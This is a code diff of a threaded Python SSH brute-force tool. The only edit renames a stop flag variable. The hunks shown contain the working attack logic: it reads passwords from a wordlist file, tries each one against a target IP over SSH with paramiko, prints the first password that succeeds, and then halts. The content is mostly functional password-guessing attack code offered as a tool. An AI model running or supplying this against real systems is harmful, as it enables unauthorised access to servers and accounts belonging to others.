@@ -10,7 +10,7 @@ import threading, time
 from termcolor import colored
 #importing the required libraries
 
-stop_flag = 0
+exit_tag = 0
 #setting the initial value to 0
 
 hammer = '''
@@ -57,14 +57,14 @@ password_file = sys.argv[3]
 
 #Defning A SSH connect Function to start SSH session Against Target...
 def ssh_connect(password, code=0):
-  global stop_flag
+  global exit_tag
   ssh = paramiko.SSHClient()
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 #checking for each correct password in List 
   try:
     ssh.connect(target_ip, port=22, username=username, password=password)
-    stop_flag = 1
+    exit_tag = 1
     print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "green", attrs=['bold']))
   except:
     print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
@@ -81,7 +81,7 @@ if os.path.exists(password_file) == False:
 #Reading For Passwords From the Specified password File..!
 with open(password_file, 'r') as file:
   for line in file.readlines():
-    if stop_flag == 1:
+    if exit_tag == 1:
       t.join()
       #Joining the Threads in-case we found a correct password..
       exit()
